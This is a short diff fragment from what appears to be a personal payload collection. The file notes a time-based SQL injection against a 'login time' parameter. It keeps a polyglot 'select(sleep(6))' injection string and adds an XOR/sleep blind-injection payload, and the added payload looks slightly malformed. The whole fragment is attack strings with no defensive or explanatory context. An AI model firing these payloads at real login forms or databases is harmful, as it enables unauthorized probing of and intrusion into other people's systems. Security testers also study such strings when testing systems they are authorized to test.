@@ -188,5 +188,5 @@ login time
 parameter = time based 
 
 select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B%5C"%2B(select(0)from(select(sleep(6)))v)
-
+10XOR(if(now)=sysdate),sleep(20),0)XORZ
 
